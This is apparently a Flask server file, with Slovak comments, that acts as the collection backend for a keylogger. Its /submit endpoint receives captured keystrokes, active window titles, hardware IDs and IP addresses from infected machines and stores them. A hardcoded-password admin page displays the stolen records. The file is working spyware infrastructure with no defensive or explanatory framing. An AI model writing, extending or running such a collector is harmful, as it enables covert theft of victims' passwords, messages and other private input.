from flask import Flask, request, render_template, redirect
from datetime import datetime

app = Flask(__name__)
PASSWORD = "120202810428Jm!"
DATA = []

@app.route('/')
def home():
    return redirect('/admin')

@app.route('/submit', methods=['POST'])
def submit():
    json_data = request.json
    print("Received data:", json_data)  # log pre debug
    
    # Debug výpisy pre kľúče
    print("Keys:", json_data.get('keys'))
    print("Active window:", json_data.get('active_window'))
    
    entry = {
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'user_id': json_data.get('user_id', 'N/A'),
        'hwid': json_data.get('hwid', 'N/A'),
        'ip_address': json_data.get('ip_address', 'N/A'),
        'keys': json_data.get('keys', 'N/A'),
        'active_window': json_data.get('active_window', 'N/A')  # opravený kľúč
    }
    DATA.append(entry)
    
    return {"status": "received"}

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST':
        if request.form.get('password') == PASSWORD:
            return render_template("admin.html", data=DATA)
        else:
            return render_template("login.html", error="Zlé heslo")
    return render_template("login.html")

@app.route('/logout')
def logout():
    return redirect('/admin')

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)







